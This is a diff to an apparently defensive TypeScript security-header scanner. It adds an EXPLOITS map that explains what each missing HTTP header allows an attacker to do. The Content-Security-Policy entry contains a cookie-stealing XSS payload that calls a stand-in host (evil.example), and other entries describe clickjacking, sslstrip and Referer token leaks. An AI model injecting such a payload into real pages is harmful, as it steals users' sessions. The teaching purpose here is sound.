@@ -16,6 +16,59 @@ export const RECOMMENDED = {
   "Cross-Origin-Resource-Policy": "same-origin",
 } as const;
 
+/**
+ * Concrete attack scenarios, keyed by header. Attached to any check that
+ * doesn't pass, so the report can teach *why* the header matters, not just
+ * that it's missing. Shown by `--explain` and always present in JSON output.
+ */
+export const EXPLOITS: Record<string, string> = {
+  "Content-Security-Policy":
+    "An attacker finds any injection point — a comment field, a search box reflected into the page, a " +
+    "compromised npm package — and plants <script>fetch('https://evil.example/?c='+document.cookie)</script>. " +
+    "Without CSP the browser runs it with your users' sessions: tokens stolen, keyloggers installed, " +
+    "fake login forms overlaid. With script-src 'self', that injected inline script is refused.",
+  "Strict-Transport-Security":
+    "A user on coffee-shop Wi-Fi types your domain without https://. Their first request goes out over " +
+    "plain HTTP, and an attacker on the network (sslstrip-style) answers it, keeps them on HTTP, and " +
+    "reads or rewrites everything — including the login form they're about to submit. HSTS makes the " +
+    "browser refuse to ever use HTTP for your domain after the first visit.",
+  "X-Content-Type-Options":
+    "Your app serves user uploads. An attacker uploads 'avatar.jpg' that actually contains HTML and " +
+    "JavaScript. Without nosniff, some browsers content-sniff the response, decide it's HTML, and " +
+    "execute the script in YOUR origin — stored XSS delivered through a file upload.",
+  "X-Frame-Options":
+    "Clickjacking: an attacker's page loads your site in an invisible full-screen iframe and positions " +
+    "a fake 'Play video' button exactly over your real 'Delete account' or 'Transfer funds' button. " +
+    "The victim clicks their page but presses yours — with their logged-in session.",
+  "Referrer-Policy":
+    "A user lands on your password-reset page: /reset?token=abc123. The page loads a third-party " +
+    "analytics script or the user clicks an external link — and the full URL, token included, is sent " +
+    "in the Referer header to that other origin. Anyone with access to those logs can reset the password.",
+  "Permissions-Policy":
+    "Any script that gets into your page — a compromised ad, a hijacked third-party widget, an XSS " +
+    "payload — can prompt for camera, microphone, or geolocation, styled to look like your app is " +
+    "asking. Disabling features you don't use removes the entire capability, prompt and all.",
+  "Cross-Origin-Opener-Policy":
+    "Your site opens (or is opened by) a malicious page: window.opener keeps a live handle across " +
+    "origins. That enables tabnabbing (rewriting your tab to a phishing clone while the user looks " +
+    "away) and XS-Leaks that probe frame counts and navigation state to infer what a logged-in user " +
+    "can see. COOP: same-origin severs that handle.",
+  "Cross-Origin-Resource-Policy":
+    "A malicious site embeds your authenticated resources (API responses, user images) as no-cors " +
+    "subresources, pulling them into its process — where Spectre-class side channels can read them. " +
+    "CORP tells the browser to refuse cross-origin embedding outright.",
+  "X-Powered-By":
+    "Reconnaissance: 'X-Powered-By: Express' tells an attacker exactly which framework CVEs and " +
+    "default behaviors to try. Version-scanning bots use this header to sort targets into exploit lists.",
+  Server:
+    "A Server header with a version number ('nginx/1.25.3') lets attackers match your exact build " +
+    "against public CVE databases and skip straight to the exploits that apply to it.",
+  "X-XSS-Protection":
+    "The legacy XSS auditor this header controls was itself exploitable: attackers abused it to " +
+    "selectively neutralize legitimate scripts (XS-Search side channels). Every modern browser has " +
+    "removed it — sending anything but '0' is at best noise, at worst a vulnerability on old browsers.",
+};
+
 /** Minimum HSTS max-age we consider adequate: 180 days. */
 const HSTS_MIN_AGE = 15552000;
 
@@ -310,5 +363,13 @@ export const rules: Rule[] = [
 ];
 
 export function runRules(ctx: ScanContext): CheckResult[] {
-  return rules.map((rule) => rule.check(ctx));
+  return rules.map((rule) => {
+    const result = rule.check(ctx);
+    // Attach the attack scenario to anything that isn't clean, so every
+    // surface (CLI, middleware, JSON) can explain the stakes.
+    if (result.status !== "pass") {
+      result.exploit = EXPLOITS[result.header];
+    }
+    return result;
+  });
 }
